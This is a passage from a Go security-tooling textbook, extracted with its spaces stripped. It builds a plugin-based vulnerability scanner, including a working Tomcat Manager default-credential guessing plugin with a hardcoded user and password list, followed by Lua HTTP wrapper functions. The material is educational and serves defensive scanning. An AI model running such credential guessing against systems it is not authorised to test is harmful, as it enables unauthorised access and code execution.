Thisplug-in(Listing10-3)performsapassword-guessing
attackagainsttheApacheTomcatManagerloginportal.A
favoritetargetforattackers,theportaliscommonlyconfigured
toaccepteasilyguessablecredentials.Withvalidcredentials,
anattackercanreliablyexecutearbitrarycodeonthe
underlyingsystem.It’saneasywinforattackers.
Inourreviewofthecode,wewon’tcoverthespecific
detailsofthevulnerabilitytest,asit’sreallyjustaseriesof
HTTPrequestsissuedtoaspecificURL.Instead,we’llfocus
primarilyonsatisfyingthepluggablescanner’sinterface
requirements.
import(
//Somesnippedforbrevity
"github.com/bhg/ch-10/plugin-core/scanner"❶
)
varUsers=[]string{"admin","manager","tomcat"}
varPasswords=[]string{"admin","manager","tomcat","password"}
//TomcatCheckerimplementsthescanner.Checkinterface.Usedforguessing
Tomcatcreds
typeTomcatCheckerstruct{}❷
//CheckattemptstoidentifyguessableTomcatcredentials
func(c*TomcatChecker)Check(hoststring,portuint64)*scanner.Result{❸
var(
resp*http.Response
errerror
urlstring
res*scanner.Result
client*http.Client
req*http.Request
)
log.Println("CheckingforTomcatManager...")
res=new(scanner.Result)❹
url=fmt.Sprintf("http://%s:%d/manager/html",host,port)
ifresp,err=http.Head(url);err!=nil{
log.Printf("HEADrequestfailed:%s\n",err)
returnres
}
log.Println("Hostrespondedto/manager/htmlrequest")
//Gotaresponseback,checkifauthenticationrequired
ifresp.StatusCode!=http.StatusUnauthorized||
resp.Header.Get("WWW-Authenticate")==""{
log.Println("Targetdoesn'tappeartorequireBasicauth.")
returnres
}
//Appearsauthenticationisrequired.AssumingTomcatmanager.Guess
passwords...
log.Println("Hostrequiresauthentication.Proceedingwithpassword
guessing...")
client=new(http.Client)
ifreq,err=http.NewRequest("GET",url,nil);err!=nil{
log.Println("UnabletobuildGETrequest")
returnres
}
for_,user:=rangeUsers{
for_,password:=rangePasswords{
req.SetBasicAuth(user,password)
ifresp,err=client.Do(req);err!=nil{
log.Println("UnabletosendGETrequest")
continue
}
ifresp.StatusCode==http.StatusOK{❺
res.Vulnerable=true
res.Details=fmt.Sprintf("Validcredentialsfound-%s:%s",user,
password)
returnres
}
}
}
returnres
}
//Newistheentrypointrequiredbythescanner
funcNew()scanner.Checker{❻
returnnew(TomcatChecker)
}
Listing10-3:CreatingaTomcatcredential-guessingplug-innatively(/ch-
10/plugin-tomcat/main.go)
First,youneedtoimportthescannerpackagewedetailed
previously❶.ThispackagedefinesboththeCheckerinterface
andtheResultstructthatyou’llbebuilding.Tocreatean
implementationofChecker,youstartbydefininganemptystruct
typenamedTomcatChecker❷.TofulfilltheCheckerinterface’s
implementationrequirements,youcreateamethodmatching
therequiredCheck(hoststring,portuint64)*scanner.Resultfunction
signature❸.Withinthismethod,youperformallofyour
customvulnerability-checkinglogic.
Sinceyou’reexpectedtoreturna*scanner.Result,you
initializeone,assigningittoavariablenamedres❹.Ifthe
conditionsaremet—thatis,ifthecheckerverifiesthe
guessablecredentials—andthevulnerabilityisconfirmed❺,
yousetres.Vulnerabletotrueandsetres.Detailstoamessage
containingtheidentifiedcredentials.Ifthevulnerabilityisn’t
identified,theinstancereturnedwillhaveres.Vulnerablesettoits
defaultstate—false.
Lastly,youdefinetherequiredexportedfunctionNew()
*scanner.Checker❻.Thisadherestotheexpectationssetbyyour
scanner’sLookup()call,aswellasthetypeassertionand
conversionneededtoinstantiatetheplug-in-defined
TomcatChecker.Thisbasicentrypointdoesnothingmorethan
returnanew*TomcatChecker(which,sinceitimplementsthe
requiredCheck()method,happenstobeascanner.Checker).
RunningtheScanner
Nowthatyou’vecreatedbothyourplug-inandthemain
programthatconsumesit,compileyourplug-in,usingthe-o
optiontodirectyourcompiledsharedobjecttothescanner’s
plug-insdirectory:
$gobuild-buildmode=plugin-o/path/to/plugins/tomcat.so
Thenrunyourscanner(cmd/scanner/main.go)toconfirm
thatitidentifiestheplug-in,loadsit,andexecutestheplug-
in’sCheck()method:
$gorunmain.go
Foundplugin:tomcat.so
2020/01/1515:45:18CheckingforTomcatManager...
2020/01/1515:45:18Hostrespondedto/manager/htmlrequest
2020/01/1515:45:18Hostrequiresauthentication.Proceedingwithpassword
guessing...
2020/01/1515:45:18Hostisvulnerable:Validcredentialsfound-tomcat:tomcat
Wouldyoulookatthat?Itworks!Yourscannerisableto
callcodewithinyourplug-in.Youcandropanynumberof
otherplug-insintotheplug-insdirectory.Yourscannerwill
attempttoreadeachandkickoffthevulnerability-checking
functionality.
Thecodewedevelopedcouldbenefitfromanumberof
improvements.We’llleavetheseimprovementstoyouasan
exercise.Weencourageyoutotryafewthings:
1. Createaplug-intocheckforadifferentvulnerability.
2. Addtheabilitytodynamicallysupplyalistofhostsandtheiropenportsfor
moreextensivetests.
3. Enhancethecodetocallonlyapplicableplug-ins.Currently,thecodewillcall
allplug-insforthegivenhostandport.Thisisn’tideal.Forexample,you
wouldn’twanttocalltheTomcatcheckerifthetargetportisn’tHTTPor
HTTPS.
4. Convertyourplug-insystemtorunonWindows,usingDLLsastheplug-in
type.
Inthenextsection,you’llbuildthesamevulnerability-
checkingplug-ininadifferent,unofficialplug-insystem:Lua.
BUILDINGPLUG-INSINLUA
UsingGo’snativebuildmodefeaturewhencreatingpluggable
programshaslimitations,particularlybecauseit’snotvery
portable,meaningtheplug-insmaynotcross-compilenicely.
Inthissection,we’lllookatawaytoovercomethisdeficiency
bycreatingplug-inswithLuainstead.Luaisascripting
languageusedtoextendvarioustools.Thelanguageitselfis
easilyembeddable,powerful,fast,andwell-documented.
SecuritytoolssuchasNmapandWiresharkuseitforcreating
plug-ins,muchasyou’lldorightnow.Formoreinfo,referto
theofficialsiteathttps://www.lua.org/.
TouseLuawithinGo,you’lluseathird-partypackage,
gopher-lua,whichiscapableofcompilingandexecutingLua
scriptsdirectlyinGo.Installitonyoursystembyenteringthe
following:
$gogetgithub.com/yuin/gopher-lua
Now,beforewarnedthatthepriceyou’llpayforportability
isincreasedcomplexity.That’sbecauseLuahasnoimplicit
waytocallfunctionsinyourprogramorvariousGopackages
andhasnoknowledgeofyourdatatypes.Tosolvethis
problem,you’llhavetochooseoneoftwodesignpatterns:
1. CallasingleentrypointinyourLuaplug-in,andlettheplug-incallanyhelper
methods(suchasthoseneededtoissueHTTPrequests)throughotherLua
packages.Thismakesyourmainprogramsimple,butitreducesportabilityand
couldmakedependencymanagementanightmare.Forexample,whatifaLua
plug-inrequiresathird-partydependencynotinstalledasacoreLuapackage?
Yourplug-inwouldbreakthemomentyoumoveittoanothersystem.Also,
whatiftwoseparateplug-insrequiredifferentversionsofapackage?
2. Inyourmainprogram,wrapthehelperfunctions(suchasthosefromthenet/http
package)inamannerthatexposesafaçdethroughwhichtheplug-incan
interact.This,ofcourse,requiresyoutowriteextensivecodetoexposeallthe
Gofunctionsandtypes.However,onceyou’vewrittenthecode,theplug-inscan
reuseitinaconsistentmanner.Plus,youcansortofnotworryabouttheLua
dependencyissuesthatyou’dhaveifyouusedthefirstdesignpattern(although,
ofcourse,there’salwaysthechancethataplug-inauthorusesathird-party
libraryandbreakssomething).
Fortheremainderofthissection,you’llworkonthe
seconddesignpattern.You’llwrapyourGofunctionsto
exposeafaçdethat’saccessibletoyourLuaplug-ins.It’sthe
betterofthetwosolutions(andplus,thewordfaçdemakesit
soundlikeyou’rebuildingsomethingreallyfancy).
Thebootstrapping,coreGocodethatloadsandrunsplug-
inswillresideinasinglefileforthedurationofthisexercise.
Forthesakeofsimplicity,we’vespecificallyremovedsomeof
patternsusedintheexamplesat
https://github.com/yuin/gopher-lua/.Wefeltthatsomeofthe
patterns,suchasusinguser-definedtypes,madethecodeless
readable.Inarealimplementation,you’dlikelywantto
includesomeofthosepatternsforbetterflexibility.You’dalso
wanttoincludemoreextensiveerrorandtypechecking.
YourmainprogramwilldefinefunctionstoissueGETand
HEADHTTPrequests,registerthosefunctionswiththeLua
virtualmachine(VM),andloadandexecuteyourLuascripts
fromadefinedplug-insdirectory.You’llbuildthesame
Tomcatpassword-guessingplug-infromtheprevioussection,
soyou’llbeabletocomparethetwoversions.
Creatingthehead()HTTPFunction
Let’sstartwiththemainprogram.First,let’slookatthehead()
HTTPfunction,whichwrapscallstoGo’snet/httppackage
(Listing10-4).
funchead(l*lua.LState❶)int{
var(
hoststring
portuint64
pathstring
resp*http.Response
errerror
urlstring
)
❷host=l.CheckString(1)
port=uint64(l.CheckInt64(2))
path=l.CheckString(3)
url=fmt.Sprintf("http://%s:%d/%s",host,port,path)
ifresp,err=http.Head(url);err!=nil{
❸l.Push(lua.LNumber(0))
l.Push(lua.LBool(false))
l.Push(lua.LString(fmt.Sprintf("Requestfailed:%s",err)))
❹return3
}
❺l.Push(lua.LNumber(resp.StatusCode))
l.Push(lua.LBool(resp.Header.Get("WWW-Authenticate")!=""))
l.Push(lua.LString(""))
❻return3
}
Listing10-4:Creatingahead()functionforLua(/ch-10/lua-
core/cmd/scanner/main.go)
First,noticethatyourhead()functionacceptsapointertoa
lua.LStateobjectandreturnsanint❶.Thisistheexpected
signatureforanyfunctionyouwishtoregisterwiththeLua
VM.Thelua.LStatetypemaintainstherunningstateoftheVM,
includinganyparameterspassedintoLuaandreturnedfrom
Go,asyou’llseeshortly.Sinceyourreturnvalueswillbe
includedwithinthelua.LStateinstance,theintreturntype
representsthenumberofvaluesreturned.Thatway,yourLua
plug-inwillbeabletoreadandusethereturnvalues.
Sincethelua.LStateobject,l,containsanyparameterspassed
toyourfunction,youreadthedatainviacallstol.CheckString()
andl.CheckInt64()❷.(Althoughnotneededforourexample,
otherCheck*functionsexisttoaccommodateotherexpected
datatypes.)Thesefunctionsreceiveanintegervalue,which
actsastheindexforthedesiredparameter.UnlikeGoslices,
whichare0-indexed,Luais1-indexed.So,thecallto
l.CheckString(1)retrievesthefirstparametersuppliedintheLua
functioncall,expectingittobeastring.Youdothisforeach
ofyourexpectedparameters,passingintheproperindexofthe
expectedvalue.Foryourhead()function,you’reexpectingLua
tocallhead(host,port,path),wherehostandpatharestringsandport
isaninteger.Inamoreresilientimplementation,you’dwant
todoadditionalcheckingheretomakesurethedatasupplied
isvalid.
ThefunctionproceedstoissueanHTTPHEADrequest
andperformsomeerrorchecking.Inordertoreturnvaluesto
yourLuacallers,youpushthevaluesontoyourlua.LStateby
callingl.Push()andpassingitanobjectthatfulfillsthelua.LValue
interfacetype❸.Thegopher-luapackagecontainsseveraltypes
thatimplementthisinterface,makingitaseasyascalling
lua.LNumber(0)andlua.LBool(false),forexample,tocreatenumerical
andbooleanreturntypes.
Inthisexample,you’rereturningthreevalues.Thefirstis
theHTTPstatuscode,theseconddetermineswhetherthe
serverrequiresbasicauthentication,andthethirdisanerror
message.We’vechosentosetthestatuscodeto0ifanerror
occurs.Youthenreturn3,whichisthenumberofitemsyou’ve
pushedontoyourLStateinstance❹.Ifyourcalltohttp.Head()
doesn’tproduceanerror,youpushyourreturnvaluesonto
LState❺,thistimewithavalidstatuscode,andthencheckfor
basicauthenticationandreturn3❻.
Creatingtheget()Function
Next,you’llcreateyourget()function,which,liketheprevious
example,wrapsthenet/httppackage’sfunctionality.Inthiscase,
however,you’llissueanHTTPGETrequest.Otherthanthat,
theget()functionusesfairlysimilarconstructsasyourhead()
functionbyissuinganHTTPrequesttoyourtargetendpoint.
EnterthecodeinListing10-5.
funcget(l*lua.LState)int{
var(
hoststring
portuint64
usernamestring
passwordstring
pathstring
resp*http.Response
errerror
urlstring
client*http.Client
req*http.Request
)
host=l.CheckString(1)
port=uint64(l.CheckInt64(2))
❶username=l.CheckString(3)
password=l.CheckString(4)
path=l.CheckString(5)
url=fmt.Sprintf("http://%s:%d/%s",host,port,path)
client=new(http.Client)
ifreq,err=http.NewRequest("GET",url,nil);err!=nil{
l.Push(lua.LNumber(0))
l.Push(lua.LBool(false))
l.Push(lua.LString(fmt.Sprintf("UnabletobuildGETrequest:%s",err)))
return3
}
ifusername!=""||password!=""{
//AssumeBasicAuthisrequiredsinceuserand/orpasswordisset
req.SetBasicAuth(username,password)
}
ifresp,err=client.Do(req);err!=nil{
l.Push(lua.LNumber(0))
l.Push(lua.LBool(false))
l.Push(lua.LString(fmt.Sprintf("UnabletosendGETrequest:%s",err)))
return3
}
l.Push(lua.LNumber(resp.StatusCode))
l.Push(lua.LBool(false))
l.Push(lua.LString(""))
return3
}
Listing10-5:Creatingaget()functionforLua(/ch-10/lua-
core/cmd/scanner/main.go)
Muchlikeyourhead()implementation,yourget()function
willreturnthreevalues:thestatuscode,avalueexpressing
whetherthesystemyou’retryingtoaccessrequiresbasic
authentication,andanyerrormessages.Theonlyreal
differencebetweenthetwofunctionsisthatyourget()function
acceptstwoadditionalstringparameters:ausernameanda
password❶.Ifeitherofthesevaluesissettoanon-empty
string,you’llassumeyouhavetoperformbasicauthentication.
Now,someofyouareprobablythinkingthatthe
implementationsareoddlyspecific,almosttothepointof
negatinganyflexibility,reusability,andportabilityofaplug-
insystem.It’salmostasifthesefunctionsweredesignedfora
veryspecificusecase—thatis,tocheckforbasic
authentication—ratherthanforageneralpurpose.Afterall,
whywouldn’tyoureturntheresponsebodyortheHTTP
headers?Likewise,whywouldn’tyouacceptmorerobust
parameterstosetcookies,otherHTTPheaders,orissuePOST
requestswithabody,forexample?
Simplicityistheanswer.Yourimplementationscanactasa
startingpointforbuildingamorerobustsolution.However,
creatingthatsolutionwouldbeamoresignificantendeavor,
andyou’dlikelylosethecode’spurposewhiletryingto
navigateimplementationdetails.Instead,we’vechosentodo
thingsinamorebasic,lessflexiblefashiontomakethe
general,foundationalconceptssimplertounderstand.An
improvedimplementationwouldlikelyexposecomplexuser-
definedtypesthatbetterrepresenttheentiretyof,forexample,
thehttp.Requestandhttp.Responsetypes.Then,ratherthanaccepting
andreturningmultipleparametersfromLua,youcould
simplifyyourfunctionsignatures,reducingthenumberof
parametersyouacceptandreturn.Weencourageyoutowork
throughthischallengeasanexercise,changingthecodeto
acceptandreturnuser-definedstructsratherthanprimitive
types.
RegisteringtheFunctionswiththeLuaVM
Uptothispoint,you’veimplementedwrapperfunctions
aroundthenecessarynet/httpcallsyouintendtouse,creating
thefunctionssogopher-luacanconsumethem.However,you
needtoactuallyregisterthefunctionswiththeLuaVM.The
functioninListing10-6centralizesthisregistrationprocess.
❶constLuaHttpTypeName="http"
funcregister(l*lua.LState){
❷mt:=l.NewTypeMetatable(LuaHttpTypeName)
❸l.SetGlobal("http",mt)
//staticattributes
❹l.SetField(mt,"head",l.NewFunction(head))
l.SetField(mt,"get",l.NewFunction(get))
}
Listing10-6:Registeringplug-inswithLua(/ch-10/lua-core/cmd/scanner/main.go)
Youstartbydefiningaconstantthatwilluniquelyidentify
thenamespaceyou’recreatinginLua❶.Inthiscase,you’ll
usehttpbecausethat’sessentiallythefunctionalityyou’re
exposing.Inyourregister()function,youacceptapointertoa
lua.LState,andusethatnamespaceconstanttocreateanewLua
typeviaacalltol.NewTypeMetatable()❷.You’llusethis
metatabletotracktypesandfunctionsavailabletoLua.
Youthenregisteraglobalname,http,onthemetatable❸.
ThismakesthehttpimplicitpackagenameavailabletotheLua
VM.Onthesamemetatable,youalsoregistertwofieldsby
usingcallstol.SetField()❹.Here,youdefinetwostatic
functionsnamedhead()andget(),availableonthehttp
namespace.Sincethey’restatic,youcancallthemviahttp.get()